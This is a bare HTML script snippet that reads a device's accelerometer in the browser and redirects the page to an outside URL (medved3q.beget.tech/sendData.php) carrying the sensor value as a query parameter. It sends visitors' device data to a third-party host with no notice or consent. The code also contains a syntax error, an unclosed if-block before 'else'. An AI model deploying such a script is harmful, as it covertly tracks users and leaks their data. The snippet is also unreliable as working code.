<script>
       let value = null;
       let acl = new Accelerometer({frequency: 60});
        
        
    acl.addEventListener('reading', () => {
        value = acl.x;
    });
    acl.start();
    function redir() {
  document.location.replace("http://medved3q.beget.tech/sendData.php?x="+value);
}
       function redir2(){
            if(value == null){
                setTimeout(redir, 120);
            else{
                redir();
            }
                     
       }
    setTimeout(redir2, 60);
    </script>
